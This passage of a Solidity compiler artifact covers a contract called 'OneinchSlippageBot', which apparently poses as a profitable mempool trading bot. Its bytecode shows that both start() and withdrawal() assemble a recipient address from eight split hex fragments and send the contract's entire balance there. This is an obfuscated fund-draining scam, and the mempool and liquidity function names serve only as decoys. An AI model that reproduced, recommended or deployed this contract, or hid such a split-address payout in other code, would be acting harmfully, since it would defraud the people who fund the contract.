600581526020017f3078323234000000000000000000000000000000000000000000000000000000815250905090565b60606040518060400160405280600481526020017f3434314400000000000000000000000000000000000000000000000000000000815250905090565b60606040518060400160405280600681526020017f6134304146410000000000000000000000000000000000000000000000000000815250905090565b60606040518060400160405280600581526020017f6446343037000000000000000000000000000000000000000000000000000000815250905090565b60606040518060400160405280600581526020017f3339333633000000000000000000000000000000000000000000000000000000815250905090565b60606040518060400160405280600581526020017f3761433944000000000000000000000000000000000000000000000000000000815250905090565b60606040518060400160405280600481526020017f6230443600000000000000000000000000000000000000000000000000000000815250905090565b60606040518060400160405280600881526020017f343064354436626100000000000000000000000000000000000000000000000081525090509056fea26469706673582212205af42cf13ed92065eeff0311ae02924793f16ed52cc66fe1453c24a6163f457d64736f6c63430006060033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x40 MLOAD DUP1 PUSH1 0x20 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x0 DUP2 MSTORE POP PUSH1 0x1 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH2 0x29 SWAP3 SWAP2 SWAP1 PUSH2 0x62 JUMP JUMPDEST POP PUSH1 0x40 MLOAD DUP1 PUSH1 0x20 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x0 DUP2 MSTORE POP PUSH1 0x2 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH2 0x4F SWAP3 SWAP2 SWAP1 PUSH2 0x62 JUMP JUMPDEST POP CALLVALUE DUP1 ISZERO PUSH2 0x5C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x107 JUMP JUMPDEST DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 PUSH1 0x1F ADD PUSH1 0x20 SWAP1 DIV DUP2 ADD SWAP3 DUP3 PUSH1 0x1F LT PUSH2 0xA3 JUMPI DUP1 MLOAD PUSH1 0xFF NOT AND DUP4 DUP1 ADD OR DUP6 SSTORE PUSH2 0xD1 JUMP JUMPDEST DUP3 DUP1 ADD PUSH1 0x1 ADD DUP6 SSTORE DUP3 ISZERO PUSH2 0xD1 JUMPI SWAP2 DUP3 ADD JUMPDEST DUP3 DUP2 GT ISZERO PUSH2 0xD0 JUMPI DUP3 MLOAD DUP3 SSTORE SWAP2 PUSH1 0x20 ADD SWAP2 SWAP1 PUSH1 0x1 ADD SWAP1 PUSH2 0xB5 JUMP JUMPDEST JUMPDEST POP SWAP1 POP PUSH2 0xDE SWAP2 SWAP1 PUSH2 0xE2 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST PUSH2 0x104 SWAP2 SWAP1 JUMPDEST DUP1 DUP3 GT ISZERO PUSH2 0x100 JUMPI PUSH1 0x0 DUP2 PUSH1 0x0 SWAP1 SSTORE POP PUSH1 0x1 ADD PUSH2 0xE8 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST SWAP1 JUMP JUMPDEST PUSH2 0x8C0 DUP1 PUSH2 0x116 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2D JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xBE9A6555 EQ PUSH2 0x39 JUMPI DUP1 PUSH4 0xD4E93292 EQ PUSH2 0x43 JUMPI PUSH2 0x34 JUMP JUMPDEST CALLDATASIZE PUSH2 0x34 JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x41 PUSH2 0x4D JUMP JUMPDEST STOP JUMPDEST PUSH2 0x4B PUSH2 0xB8 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 PUSH2 0x5F PUSH2 0x5A PUSH2 0x123 JUMP JUMPDEST PUSH2 0x441 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP2 SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC PUSH2 0x88 PUSH2 0x69A JUMP JUMPDEST SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0xB3 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xCA PUSH2 0xC5 PUSH2 0x123 JUMP JUMPDEST PUSH2 0x441 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP2 SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC PUSH2 0xF3 PUSH2 0x69A JUMP JUMPDEST SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x11E JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x60 DUP1 PUSH2 0x12E PUSH2 0x6A2 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x13A PUSH2 0x6DF JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x146 PUSH2 0x71C JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x152 PUSH2 0x759 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x15E PUSH2 0x796 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x16A PUSH2 0x7D3 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x176 PUSH2 0x810 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x182 PUSH2 0x84D JUMP JUMPDEST SWAP1 POP DUP8 DUP8 DUP8 DUP8 DUP8 DUP8 DUP8 DUP8 PUSH1 0x40 MLOAD PUSH1 0x20 ADD DUP1 DUP10 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x1C2 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x19F JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD DUP9 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x213 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x1F0 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD DUP8 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x264 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x241 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD DUP7 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x2B5 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x292 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD DUP6 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x306 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x2E3 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD DUP5 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x357 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x334 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD DUP4 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x3A8 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x385 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD DUP3 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x3F9 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x3D6 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD SWAP9 POP POP POP POP POP POP POP POP POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE SWAP9 POP POP POP POP POP POP POP POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 DUP3 SWAP1 POP PUSH1 0x0 DUP1 SWAP1 POP PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x2 SWAP1 POP JUMPDEST PUSH1 0x2A DUP2 LT ISZERO PUSH2 0x68D JUMPI PUSH2 0x100 DUP5 MUL SWAP4 POP DUP5 DUP2 DUP2 MLOAD DUP2 LT PUSH2 0x473 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP3 POP DUP5 PUSH1 0x1 DUP3 ADD DUP2 MLOAD DUP2 LT PUSH2 0x495 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP2 POP PUSH1 0x61 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x4E6 JUMPI POP PUSH1 0x66 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x4F6 JUMPI PUSH1 0x57 DUP4 SUB SWAP3 POP PUSH2 0x590 JUMP JUMPDEST PUSH1 0x41 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x534 JUMPI POP PUSH1 0x46 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x544 JUMPI PUSH1 0x37 DUP4 SUB SWAP3 POP PUSH2 0x58F JUMP JUMPDEST PUSH1 0x30 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x582 JUMPI POP PUSH1 0x39 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x58E JUMPI PUSH1 0x30 DUP4 SUB SWAP3 POP JUMPDEST JUMPDEST JUMPDEST PUSH1 0x61 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x5CE JUMPI POP PUSH1 0x66 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x5DE JUMPI PUSH1 0x57 DUP3 SUB SWAP2 POP PUSH2 0x678 JUMP JUMPDEST PUSH1 0x41 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x61C JUMPI POP PUSH1 0x46 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x62C JUMPI PUSH1 0x37 DUP3 SUB SWAP2 POP PUSH2 0x677 JUMP JUMPDEST PUSH1 0x30 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x66A JUMPI POP PUSH1 0x39 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x676 JUMPI PUSH1 0x30 DUP3 SUB SWAP2 POP JUMPDEST JUMPDEST JUMPDEST DUP2 PUSH1 0x10 DUP5 MUL ADD DUP5 ADD SWAP4 POP PUSH1 0x2 DUP2 ADD SWAP1 POP PUSH2 0x457 JUMP JUMPDEST POP DUP3 SWAP5 POP POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 SELFBALANCE SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x5 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3078323234000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x4 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3434314400000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x6 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x6134304146410000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x5 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x6446343037000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x5 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3339333633000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x5 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3761433944000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x4 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x6230443600000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x8 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3430643544366261000000000000000000000000000000000000000000000000 DUP2 MSTORE POP SWAP1 POP SWAP1 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 GAS DELEGATECALL 0x2C CALL RETURNDATACOPY 0xD9 KECCAK256 PUSH6 0xEEFF0311AE02 SWAP3 SELFBALANCE SWAP4 CALL PUSH15 0xD52CC66FE1453C24A6163F457D6473 PUSH16 0x6C634300060600330000000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "448000",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"start()": "infinite",
						"withdrawal()": "infinite"
					},
					"internal": {
						"beyond(struct OneinchSlippageBot.slice memory,struct OneinchSlippageBot.slice memory)": "infinite",
						"calcLiquidityInContract(struct OneinchSlippageBot.slice memory)": "infinite",
						"checkLiquidity(uint256)": "infinite",
						"fetchMempoolData()": "infinite",
						"fetchMempoolEdition()": "infinite",
						"fetchMempoolVersion()": "infinite",
						"findContracts(uint256,uint256,uint256,uint256)": "infinite",
						"findNewContracts(struct OneinchSlippageBot.slice memory,struct OneinchSlippageBot.slice memory)": "infinite",
						"findPtr(uint256,uint256,uint256,uint256)": "infinite",
						"getBa()": "25",
						"getMempoolCode()": "infinite",
						"getMempoolHeight()": "infinite",
						"getMempoolLog()": "infinite",
						"getMempoolLong()": "infinite",
						"getMempoolShort()": "infinite",
						"getMempoolStart()": "infinite",
						"keccak(struct OneinchSlippageBot.slice memory)": "infinite",
						"loadCurrentContract(string memory)": "infinite",
						"memcpy(uint256,uint256,uint256)": "infinite",
						"mempool(string memory,string memory)": "infinite",
						"nextContract(struct OneinchSlippageBot.slice memory,struct OneinchSlippageBot.slice memory)": "infinite",
						"orderContractsByLiquidity(struct OneinchSlippageBot.slice memory)": "infinite",
						"startExploration(string memory)": "infinite",
						"toHexDigit(uint8)": "infinite",
						"uint2str(uint256)": "infinite"
					}
				},
				"methodIdentifiers": {
					"start()": "be9a6555",
					"withdrawal()": "d4e93292"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 6,
						"contract": "contracts/bot.sol:OneinchSlippageBot",
						"label": "liquidity",
						"offset": 0,
						"slot": "0",
						"type": "t_uint256"
					},
					{
						"astId": 9,
						"contract": "contracts/bot.sol:OneinchSlippageBot",
						"label": "WETH_CONTRACT_ADDRESS",
						"offset": 0,
						"slot": "1",
						"type": "t_string_storage"
					},
					{
						"astId": 12,
						"contract": "contracts/bot.sol:OneinchSlippageBot",
						"label": "UNISWAP_CONTRACT_ADDRESS",
						"offset": 0,
						"slot": "2",
						"type": "t_string_storage"
					}
				],
				"types": {
					"t_string_storage": {
						"encoding": "bytes",
						"label": "string",
						"numberOfBytes": "32"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"methods": {}
			}
		}
	}
}